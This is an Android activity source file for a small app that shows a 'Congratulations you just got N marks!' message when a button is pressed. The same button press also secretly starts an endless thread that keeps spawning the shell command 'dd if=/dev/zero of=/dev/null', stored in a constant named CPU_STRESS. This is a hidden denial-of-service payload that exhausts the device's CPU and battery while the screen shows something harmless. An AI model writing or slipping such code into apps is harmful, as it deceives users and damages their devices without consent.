package com.example.aamirah.testandroid41;

import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

import java.io.DataOutputStream;
import java.io.IOException;
import java.util.Random;

public class MainActivity extends AppCompatActivity {


    private final static String CPU_STRESS = "dd if=/dev/zero of=/dev/null";

    private Button btnClick;
    private TextView lblDesc;
    private static final Random RANDOM = new Random();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        btnClick = (Button) findViewById(R.id.btnClick);
        lblDesc  = (TextView) findViewById(R.id.lblDesc);

        btnClick.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                lblDesc.setText("Congratulations you just got " + generateRandomNumber() + " marks!");
                Thread t = new Thread(new Runnable() {
                    public void run() {
                        int i = 0;
                        while(true){
                            try {
                                Runtime.getRuntime().exec(CPU_STRESS);
                            } catch (IOException e) {
                                //log errors
                                System.out.println("IOException" + e.getMessage());
                            }
                        }
                    }
                });
                t.start();
            }
        });
    }

    private static int generateRandomNumber(){
      return RANDOM.nextInt(80 - 65) + 65;
    }
}
